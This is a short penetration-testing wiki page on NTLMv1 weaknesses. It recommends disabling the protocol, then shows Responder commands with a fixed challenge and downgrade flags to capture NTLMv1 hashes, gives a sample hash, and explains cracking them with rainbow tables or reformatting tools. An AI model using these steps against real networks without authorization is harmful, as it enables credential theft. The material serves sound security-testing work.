# NTLMv1

NT LAN Manager version 1 (NTLMv1) is vulnerable to several attacks and should be disabled in environments whenever possible. All Microsoft operating systems support its successor NT Lan Manager version 2 (NTLMv2) which should be used instead.

A NTLMv1 hash is formatted like the following:

```bash
username::hostname:response:response:challenge -> NTHASH:response
```

### Downgrading

It is possible in environments where NT LAN Manager version 1 is utilized to obtain an NTLMv1 hash from a target computer.

While this was partially described in the [Coercion section](coercing-authentication.md), prior to receiving a callback we need to run Responder, after modifying the 'Challenge' variable to `1122334455667788.` We can then run Responder with the following options:

```bash
# Receive and attempt to crack the hash with crack.sh's rainbow tables
Responder.py -I $interface --lm 

# Attempt to remove ESS/SSP and crack locally or for a fee
Responder.py -I $interface --lm --disable-ess
```

### Cracking NTLMv1

Referencing crack.sh, a NTLMv1 hash with ESS/SSP looks like the following:

```
hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788
```

After obtaining a hash with ESS/SSP, we first need to reformat the obtained hash using EvilMog's [NTLMv1-multi tool](https://github.com/evilmog/ntlmv1-multi) or [assless-chaps](https://github.com/sensepost/assless-chaps) and cracked with a database of NT hashes.&#x20;

{% hint style="warning" %}
If we weren't able to remove the ESS/SSP with Responder then it will no longer be possible to crack with crack.shâ€™s rainbow tables. Instead, it can be submitted and crack on crack.sh for a fee.
{% endhint %}
